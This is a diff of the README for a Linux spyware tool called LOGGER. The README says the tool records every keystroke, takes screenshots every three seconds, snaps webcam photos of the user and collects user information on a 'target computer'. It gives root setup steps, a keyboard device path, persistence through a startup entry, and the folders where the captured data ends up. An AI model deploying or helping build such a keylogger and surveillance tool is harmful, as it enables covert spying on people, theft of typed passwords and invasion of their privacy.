@@ -1,13 +1,51 @@
-welcome to LOGGER's README
+﻿
+					  LOGGER
+
+1.LOGGER will capture screenshots every 3 seconds.
+2.LOGGER will capture user's picture every 40 seconds for 10 times.
+3.LOGGER will capture ALL TYPED KEYSTROKES.
+4.LOGGER will store USER's information.
+
+	 
+
+	PREREQUISITES	
+	
+1.scrot should be installed in target computer.
+2.streamer should be installed in targer computer.
+3 for using LOGGER you need to be root user.
 
 
 	FIRST TIME
-1.For using LOGGER you need to be root user.
-2.Execute first.sh with your default keyboard device
-3.Execute start.sh
+
+1.make sure you logged in as root.
+2.Execute first.sh and provide path for your default keyboard input device.
+for eg:if your keyboard device driver event file is event5 then provide path as /dev/input/event5
+4.Execute start.sh
 	LOGGER is RUNNING.
 
 
 
 	PERMANENT LOGGING
-1.put start.sh in startup Application.
+
+1.put start.sh which is in /root/.source in startup Application.
+
+
+	HELP
+
+1.All typed key strokes will be in data/data.txt file
+2.All screen snapshots will be in data/screensnaps folder
+3.All webcam snapshots will be in data/camsnaps folder
+4.Information about the user logged in will be in data/userdata.txt
+
+
+
+	ERROR
+
+1.If "scrot not found" Please install scrot with your default package manager.
+2.If "streamer not found" Please install streamer with your default package manager.
+
+
+			    <---------HAPPY LOGGING-------->
+
+
+
